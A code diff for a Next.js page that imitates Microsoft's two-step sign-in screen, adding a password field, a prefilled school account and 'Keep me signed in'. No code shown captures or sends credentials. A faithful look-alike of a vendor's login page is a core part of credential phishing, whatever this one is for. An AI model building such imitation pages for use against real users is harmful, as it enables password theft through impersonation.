@@ -1,6 +1,4 @@
-import Link from 'next/link';
-
-export default function Home() {
+export default function PasswordPage() {
   return (
     <main className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
       {/* Microsoft Logo */}
@@ -23,31 +21,68 @@ export default function Home() {
 
       {/* Login Box */}
       <div className="w-full max-w-[440px] p-8 border border-gray-200 rounded-lg shadow-sm bg-white">
-        <h1 className="text-2xl font-semibold text-gray-900 mb-6">Sign in</h1>
+        <div className="mb-6">
+          <button
+            type="button"
+            className="text-sm text-gray-600 hover:underline flex items-center gap-1 mb-4"
+          >
+            <svg 
+              width="12" 
+              height="12" 
+              viewBox="0 0 12 12" 
+              fill="currentColor"
+            >
+              <path d="M10.5 6L6 1.5L1.5 6" stroke="currentColor" strokeWidth="1.5" fill="none"/>
+            </svg>
+            Back
+          </button>
+          
+          <div className="flex items-center gap-3">
+            <div className="w-8 h-8 rounded-full bg-[#0067b8] flex items-center justify-center text-white text-sm font-medium">
+              S
+            </div>
+            <div>
+              <p className="text-sm text-gray-700">student@school.edu</p>
+              <p className="text-xs text-gray-500">School account</p>
+            </div>
+          </div>
+        </div>
+        
+        <h1 className="text-2xl font-semibold text-gray-900 mb-6">Enter password</h1>
         
         <form className="space-y-4">
           <div>
             <label 
-              htmlFor="email" 
+              htmlFor="password" 
               className="block text-sm text-gray-700 mb-1"
             >
-              Email, phone, or Skype
+              Password
             </label>
             <input
-              id="email"
-              type="text"
+              id="password"
+              type="password"
               className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-base"
               autoComplete="off"
             />
           </div>
 
+          <div className="flex items-center justify-between">
+            <label className="flex items-center gap-2 cursor-pointer">
+              <input 
+                type="checkbox" 
+                className="w-4 h-4 rounded border-gray-300 text-[#0067b8] focus:ring-[#0067b8]"
+              />
+              <span className="text-sm text-gray-700">Keep me signed in</span>
+            </label>
+          </div>
+
           <div className="pt-2">
-            <Link
-              href="/password"
-              className="inline-block w-full bg-[#0067b8] text-white font-semibold py-2.5 px-4 rounded hover:bg-[#005a9e] transition-colors text-center"
+            <button
+              type="submit"
+              className="w-full bg-[#0067b8] text-white font-semibold py-2.5 px-4 rounded hover:bg-[#005a9e] transition-colors"
             >
-              Next
-            </Link>
+              Sign in
+            </button>
           </div>
         </form>
 
@@ -56,7 +91,7 @@ export default function Home() {
             href="#" 
             className="text-sm text-[#0067b8] hover:underline"
           >
-            Can&#39;t access your account?
+            Forgot password?
           </a>
         </div>
       </div>
